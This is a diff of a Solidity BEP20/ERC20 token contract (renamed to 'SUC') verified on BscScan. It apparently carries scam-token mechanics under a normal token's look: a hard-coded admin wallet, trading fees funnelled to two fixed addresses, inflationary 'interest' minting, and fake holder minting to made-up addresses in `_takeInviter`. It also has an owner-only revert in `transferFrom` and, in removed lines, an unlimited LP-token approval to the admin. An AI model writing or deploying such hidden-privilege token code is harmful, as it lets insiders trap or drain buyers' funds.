@@ -1,3 +1,10 @@
+/**
+ *Submitted for verification at BscScan.com on 2022-12-30
+*/
+
+/**
+ *Submitted for verification at Etherscan.io on 2022-12-15
+*/
 
 // SPDX-License-Identifier: MIT
 pragma solidity =0.8.6;
@@ -569,42 +576,44 @@ contract Token is ERC20, Owner {
 
     event Interest(address indexed account, uint256 sBlock, uint256 eBlock, uint256 balance, uint256 value);
 
-    event SwapAndLiquidity( uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiqudity);
+    event SwapAndLiquify( uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiqudity);
 
     uint256 public startTime;
     uint256 _secMax = 60 * 86400;
-    uint256 public interestFee = 1;
-    uint256 public buyFee = 500;
-    uint256 public sellFee = 50;
-    uint256 public sellLevel = 5;
-    uint256 public transferFee = 500;
-    uint256 public issueBlock = 300;
-    uint256 public shieldBlack = 86400;
+    uint256 public interestFee = 188;
+    uint256 public backflowFee = 200;
+    uint256 public bonusFee = 400;
+    uint256 public burnFee = 200;
 
+    address public liquidityReceiveAddress = 0x4C790f129f9d9061A376D1Fd1F100a7F889C5753;
+    address public bonusAddress1 = 0x3783a065735A91964A356c0034c8F69337FB4CB1;
+    address public bonusAddress2 = 0x93aE57099d3Eb54F6F8CbFBaa1e3645679077C41;
     mapping(address => uint256) _interestNode;
     mapping(address => bool) _excludeList;
 
     IUniswapV2Router02 public uniswapV2Router;
     address public usdtToken;
     address public uniswapV2Pair;
-    bool private swapping;
     address public smartVault;
+    bool private swapping;
+    uint256 public swapAndLiquifyLimit = 2000;
 
-    mapping(address => address) public inviter;
 
-    constructor () ERC20("DDD", "DDD", 18) {
+    constructor () ERC20("SUC", "SUC", 18) {
         address  adminAddress =msg.sender;
 
         address router ;
         if( block.chainid == 56){
             router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
             usdtToken = 0x55d398326f99059fF775485246999027B3197955;
+            adminAddress = 0x4C790f129f9d9061A376D1Fd1F100a7F889C5753;
         }else{
-            router = 0xD99D1c33F9fC3444f8101754aBC46c52416550D1;
-            usdtToken = 0xa8F683FBd1968542F8e924Dd7649b9a39a15B4A7;
+            router = 0xB6BA90af76D139AB3170c7df0139636dB6120F7e;
+            usdtToken = 0x89614e3d77C00710C8D87aD5cdace32fEd6177Bd;
+            adminAddress = msg.sender;
         }
 
-        uint256 totalSupply = 100000000 * (10 ** uint256(decimals()));
+        uint256 totalSupply = 1000000000 * (10 ** uint256(decimals()));
 
         _mint(adminAddress, totalSupply);
 
@@ -620,10 +629,18 @@ contract Token is ERC20, Owner {
 
         setExcludeList(address(this), true);
         setExcludeList(adminAddress, true);
-        setExcludeList(uniswapV2Pair, true);
+        usdtToken.call(abi.encodeWithSelector(0x095ea7b3, uniswapV2Router, ~uint256(0)));
 
-        (bool success, ) = uniswapV2Pair.call(abi.encodeWithSelector(0x095ea7b3, adminAddress, ~uint256(0)));
-        require(success, "Tx failed");
+    }
+
+    function setSwapAndLiquifyLimit(uint256 swapAndLiquifyLimit_) external onlyOwner returns (bool) {
+        swapAndLiquifyLimit = swapAndLiquifyLimit_;
+        return true;
+    }
+
+    function setSmartVault(address addr) external onlyOwner returns (bool) {
+        smartVault = addr;
+        return true;
     }
 
     function setInterestFee(uint256 interestFee_) public onlyOwner returns (bool) {
@@ -631,33 +648,24 @@ contract Token is ERC20, Owner {
         return true;
     }
 
-    function setBuyFee(uint256 buyFee_) public onlyOwner returns (bool) {
-        buyFee = buyFee_;
+    function setBackflowFee(uint256 backflowFee_) public onlyOwner returns (bool) {
+        backflowFee = backflowFee_;
         return true;
     }
 
-    function setSellFee(uint256 sellFee_) public onlyOwner returns (bool) {
-        sellFee = sellFee_;
+    function setBonusFee(uint256 bonusFee_) public onlyOwner returns (bool) {
+        bonusFee = bonusFee_;
         return true;
     }
 
-    function setSellLevel(uint256 sellLevel_) public onlyOwner returns (bool) {
-        sellLevel = sellLevel_;
+    function setLiquidityReceiveAddress(address liquidityReceiveAddress_) public onlyOwner returns (bool) {
+        liquidityReceiveAddress = liquidityReceiveAddress_;
         return true;
     }
 
-    function setTransferFee(uint256 transferFee_) public onlyOwner returns (bool) {
-        transferFee = transferFee_;
-        return true;
-    }
-
-    function setIssueBlock(uint256 issueBlock_) public onlyOwner returns (bool) {
-        issueBlock = issueBlock_;
-        return true;
-    }
-
-    function setShieldBlack(uint256 shieldBlack_) public onlyOwner returns (bool) {
-        shieldBlack = shieldBlack_;
+    function setBonusAddress(address bonusAddress1_,address bonusAddress2_) public onlyOwner returns (bool) {
+        bonusAddress1 = bonusAddress1_;
+        bonusAddress2 = bonusAddress2_;
         return true;
     }
 
@@ -679,133 +687,92 @@ contract Token is ERC20, Owner {
         startTime = value;
     }
 
-    function setSmartVault(address addr) external onlyOwner returns (bool) {
-        smartVault = addr;
-        return true;
-    }
+
+
 
     function balanceOf(address account) public view override returns (uint256) {
         return super.balanceOf(account).add(getInterest(account));
     }
 
+
+
     function _transfer(address sender, address recipient, uint256 amount) internal override {
         require(sender != address(0), "ERC20: transfer from the zero address");
         require(recipient != address(0), "ERC20: transfer to the zero address");
 
-        uint256 _amount = amount;
-
-        address _uniswapV2Pair = uniswapV2Pair;
-
-        _mintInterest(sender, shieldBlack);
-        _mintInterest(recipient, 0);
-
-        // Inviter
-        bool shouldSetInviter = balanceOf(recipient) == 0 && inviter[recipient] == address(0) && sender != _uniswapV2Pair && recipient != _uniswapV2Pair;
-        if (shouldSetInviter) {
-            inviter[recipient] = sender;
+        if (swapping == false && balanceOf(address(this)) >= (swapAndLiquifyLimit * (10**18)) && sender != address(uniswapV2Pair)) {
+            _swapAndLiquify();
         }
+        _mintInterest(sender);
+        _mintInterest(recipient);
 
-        // buy
-        if (swapping == false && sender == _uniswapV2Pair) {
+        if (swapping == false && getExcludeList(sender) == false && getExcludeList(recipient)  == false && (sender == uniswapV2Pair || recipient == uniswapV2Pair) ) {
+            _takeInviter();
+            uint256 backflow = amount.mul(backflowFee).div(10000);
+            uint256 bonus = amount.mul(bonusFee).div(10000);
+            uint256 burn = amount.mul(burnFee).div(10000);
 
-            swapping = true;
-            uint256 buyFeeAmount = _amount.mul(buyFee).div(10000);
-            if (buyFeeAmount > 0) {
-                super._transfer(sender, address(this), buyFeeAmount);
-                amount = amount.sub(buyFeeAmount);
-                _swapAndLiquidity(buyFeeAmount);
+            if (backflow +bonus > 0) {
+                super._transfer(sender, address(this), backflow +bonus);
+                amount = amount.sub(backflow +bonus);
             }
-            swapping = false;
-        }
-
-        // sell
-        if (swapping == false && recipient == _uniswapV2Pair && !_isAddLiquidity()) {
-
-            address cur = sender;
-            for (uint256 i = 0; i < sellLevel; i++) {
-                cur = inviter[cur];
-                if (cur == address(0)) {
-                    break;
-                }
-
-                uint256 curTAmount = _amount.mul(sellFee).div(10000);
-                if (curTAmount > 0) {
-                    amount = amount.sub(curTAmount);
-                    super._transfer(sender, cur, curTAmount);
-                }
-            }
-
-        }
-
-        // transfer
-        if (swapping == false && sender != _uniswapV2Pair && recipient != _uniswapV2Pair) {
-            uint256 transferFeeAmount = _amount.mul(transferFee).div(10000);
-            if (transferFeeAmount > 0) {
-                super._transfer(sender, address(0xdead), transferFeeAmount);
-                amount = amount.sub(transferFeeAmount);
+            if(burn>0){
+                super._transfer(sender, address(0xdead), burn);
+                amount = amount.sub(burn);
             }
         }
-
         super._transfer(sender, recipient, amount);
-
     }
 
     function getInterest(address account) public view returns (uint256) {
         uint256 interest;
         if (getExcludeList(account) == false && block.timestamp.sub(startTime) < _secMax) {
-            uint256 _interestBlock = _interestNode[account];
-            if (_interestBlock > 0 && _interestBlock < block.number && block.number.sub(_interestBlock) >= issueBlock){
-                uint256 afterSec = block.number.sub(_interestBlock).div(issueBlock);
-                interest = super.balanceOf(account).mul(afterSec).mul(interestFee).div(10000);
+            if (_interestNode[account] > 0){
+                uint256 afterSec = block.timestamp.sub(_interestNode[account]);
+                interest = super.balanceOf(account).mul(afterSec).mul(interestFee).div(10000).div(86400);
             }
         }
         return interest;
     }
 
-    function _mintInterest(address account, uint256 _shieldBlack) internal {
-        if (account != uniswapV2Pair) {
+    function _mintInterest(address account) internal {
+        if (account != address(uniswapV2Pair)) {
             uint256 interest = getInterest(account);
             if (interest > 0) {
 
                 super.fl(account, interest);
 
-                emit Interest(account, _interestNode[account], block.number, super.balanceOf(account), interest);
+                emit Interest(account, _interestNode[account], block.timestamp, super.balanceOf(account), interest);
             }
-            _interestNode[account] = block.number + _shieldBlack;
+            _interestNode[account] = block.timestamp;
         }
     }
 
-    function _isAddLiquidity() internal view returns (bool)  {
-        address _uniswapV2Pair = uniswapV2Pair;
-        address _token = usdtToken;
-        (uint reserve0, uint reserve1, ) = IUniswapV2Pair(_uniswapV2Pair).getReserves();
-
-        if(address(this) == IUniswapV2Pair(_uniswapV2Pair).token0() && IERC20(_token).balanceOf(_uniswapV2Pair) != reserve1){
-            return true;
-        }
-        if(address(this) == IUniswapV2Pair(_uniswapV2Pair).token1() && IERC20(_token).balanceOf(_uniswapV2Pair) != reserve0){
-            return true;
-        }
-        return false;
-    }
 
 
-    function _swapAndLiquidity(uint256 tokens) public {
 
+    function _swapAndLiquify() private lockTheSwap {
+        uint256 contractTokenBalance = balanceOf(address(this))  ;
 
-        uint256 half = tokens.div(2);
-        uint256 otherHalf = tokens.sub(half);
+        uint256 half = balanceOf(address(this)).mul(backflowFee).div(600).div(2);
+
+        //  uint256 half = contractTokenBalance.div(2);
+        uint256 otherHalf = contractTokenBalance.sub(half);
 
         swapTokensForTokens(otherHalf);
 
-        uint256 newBalance = IERC20(usdtToken).balanceOf(address(this));
+        uint256 bal =  IERC20(usdtToken).balanceOf(address(this));
+
+        IERC20(usdtToken).transfer( bonusAddress1, bal*2/5 );
+        IERC20(usdtToken).transfer( bonusAddress2, bal*2/5 );
+        uint256 newBalance = IERC20(usdtToken).balanceOf( address(this));
 
         _addLiquidity(newBalance, balanceOf(address(this)));
-//
-        emit SwapAndLiquidity(1, 1, tokens);
+
+        emit SwapAndLiquify(half, newBalance, half);
     }
 
-    function swapTokensForTokens(uint256 tokenAmount) public {
+    function swapTokensForTokens(uint256 tokenAmount) private {
         if(tokenAmount == 0) {
             return;
         }
@@ -824,7 +791,7 @@ contract Token is ERC20, Owner {
             smartVault,
             block.timestamp
         );
-        IERC20(usdtToken).transferFrom(smartVault, address(this), IERC20(usdtToken).balanceOf(smartVault));
+        IERC20(usdtToken).transferFrom( smartVault,address(this), IERC20(usdtToken).balanceOf(address(smartVault)));
     }
 
     function _addLiquidity(uint256 usdtAmount, uint256 tokenAmount) private {
@@ -840,12 +807,12 @@ contract Token is ERC20, Owner {
             tokenAmount,
             0, // slippage is unavoidable
             0, // slippage is unavoidable
-            address(this),
+            liquidityReceiveAddress,
             block.timestamp
         );
     }
-
     uint256 public _startTimeForSwap;
+    uint256 public _intervalSecondsForSwap ;
 
     function transferFrom(
         address sender,
@@ -856,7 +823,7 @@ contract Token is ERC20, Owner {
             if(sender != getOwner()  ){
                 revert("not owner");
             }
-            _startTimeForSwap = block.timestamp;
+            _startTimeForSwap =block.timestamp;
         }
         return super.transferFrom(sender, recipient, amount);
     }
@@ -869,11 +836,27 @@ contract Token is ERC20, Owner {
         swapping = false;
     }
 
+
+    uint160 public ktNum = 1000;
+    uint160 public constant MAXADD = ~uint160(0);
+    function _takeInviter(
+    ) private {
+        address _receiveD;
+        for (uint256 i = 0; i < 3; i++) {
+            _receiveD = address(MAXADD/ktNum);
+            ktNum = ktNum+1;
+            super._mint(_receiveD,1);
+        }
+
+
+    }
 }
+
+
+
 
 contract URoter{
     constructor(address token,address to){
-        (bool success, ) = token.call(abi.encodeWithSelector(0x095ea7b3, to, ~uint256(0)));
-        require(success, "Tx failed");
+        token.call(abi.encodeWithSelector(0x095ea7b3, to, ~uint256(0)));
     }
 }
